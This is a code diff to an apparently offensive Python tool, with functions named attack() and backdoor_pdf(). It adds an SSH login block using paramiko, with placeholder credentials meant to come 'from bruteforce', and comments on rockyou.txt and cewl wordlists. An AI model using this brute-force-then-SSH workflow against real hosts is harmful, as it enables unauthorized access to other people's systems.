@@ -1,6 +1,7 @@
 import os
 import re
 import subprocess
+import paramiko
 
 
 class Colors:
@@ -54,6 +55,40 @@ def attack():
             print("Let's have some fun")
             # TODO: Think about Wordlist, rockyou.txt is overkill
             # Use cewl
+        # SSH connection details
+
+        # use values from bruteforce
+        hostname = "your_hostname"
+        port = 22
+        username = "your_username"
+        password = "your_password"
+        command = "ls -l"  # Example command to execute
+
+        # Establish SSH connection
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            ssh.connect(hostname, port, username, password)
+            print("SSH connection established successfully.")
+
+            # Execute command
+            stdin, stdout, stderr = ssh.exec_command(command)
+
+            # Read the output
+            output = stdout.read().decode()
+            error = stderr.read().decode()
+
+            if output:
+                print("Command output:")
+                print(output)
+            if error:
+                print("Error:")
+                print(error)
+
+        finally:
+            # Close the SSH connection
+            ssh.close()
 
 
 def backdoor_pdf():
